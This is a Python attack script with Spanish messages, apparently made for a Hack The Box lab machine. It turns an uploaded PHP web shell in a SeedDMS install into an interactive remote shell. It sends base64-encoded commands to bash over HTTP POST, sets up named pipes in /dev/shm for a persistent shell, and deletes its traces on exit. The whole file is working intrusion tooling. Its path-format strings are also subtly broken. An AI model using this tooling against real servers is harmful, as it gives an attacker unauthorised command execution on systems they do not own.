#!/usr/bin/python3

import requests, threading, signal, time, sys
from random import randrange
from base64 import b64encode

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	print("[*] Eliminando archivos...\n")
	RunCmd(erasestdin)
	RunCmd(erasestdout)
	print("[*] Todos los arhchivos han sido eliminados\n")
	sys.exit(0)

#CTRL+C
signal.signal(signal.SIGINT, def_handler)

#Variables
main_url = "http://dms-pit.htb/seeddms51x/data/1048576/30/1.php"
session = randrange(1000, 9999)
stdin = "/dev/shm/%.input" % session
stdout = "/dev/shm/%.output" %session
erasestdin = "/bin/rm %s" % stdin
erasestdout = "/bin/rm %s" % stdout
class AllTheReads(object):

	def __init__(self, interval=1):

		self.interval = interval

		thread = threading.Thread(target=self.run, args=())
		thread.daemon = True
		thread.start()

	def run(self):
		clearoutput = "echo '' > %s" % stdout
		readoutput = "/bin/cat %s" % stdout

		while True:

			output = RunCmd(readoutput)

			if output:

				RunCmd(clearoutput)
				print(output)

			time.sleep(self.interval)

def RunCmd(cmd):

	cmd = cmd.encode()
	cmd = b64encode(cmd).decode()

	post_data = {
		'cmd': 'echo %s | base64 -d | bash' % cmd
	}

	r = (requests.post(main_url, data=post_data, timeout=5).text).strip()

	return r

def SetupShell():

	NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s """ % (stdin, stdin, stdout)

	try:
		RunCmd(NamedPipes)
	except:
		None

	return None

def WriteCmd(cmd):

	cmd = cmd.encode()
	cmd = b64encode(cmd).decode()

	post_data = {
		'cmd': 'echo %s | base64 -d > %s' % (cmd, stdin)
	}

	r = (requests.post(main_url, data=post_data, timeout=5).text).strip()

def ReadCmd():

	readoutput = "/bin/cat %s" % stdout

	output = RunCmd(readoutput)

	return output

if __name__ == '__main__':

	SetupShell()
	ReadAllTheThings = AllTheReads()

	while True:

		cmd = input("> ")
		WriteCmd(cmd + "\n")
		time.sleep(1.1)
